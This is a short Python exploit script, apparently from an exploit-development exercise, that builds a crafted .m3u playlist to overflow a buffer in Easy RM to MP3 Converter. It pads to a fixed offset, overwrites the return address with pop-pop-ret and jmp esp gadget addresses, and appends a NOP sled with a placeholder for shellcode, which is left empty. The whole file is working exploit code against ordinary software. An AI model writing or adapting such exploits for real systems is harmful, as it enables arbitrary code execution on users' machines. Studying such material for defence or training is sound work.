import struct

fuzz = "\x41" * (25000+1043)

# pop pop ret
# pop eax, pop esi, ret
fuzz += struct.pack('<I', 0x0188772c)
fuzz += "XXXX" # 4 bytes before esp
fuzz += "\x42" * 8 # will be pop pop reckt XD
#using jmp esp from previous exploit
fuzz += struct.pack('<I',0x01ae023f)

# ret to shellcode
shellcode = ""
fuzz += "\x90"*12 + shellcode

# keep the buffer length constant
fuzz += "\x44" * (30000-25000-1043-4-4-8-4-12-351)

filename = "C:\Documents and Settings\yunaranyancat\Desktop\EasyRMtoMP3Converter\pop_pop_ret.m3u"

with open(filename, 'w') as outfile:
    outfile.write(fuzz)

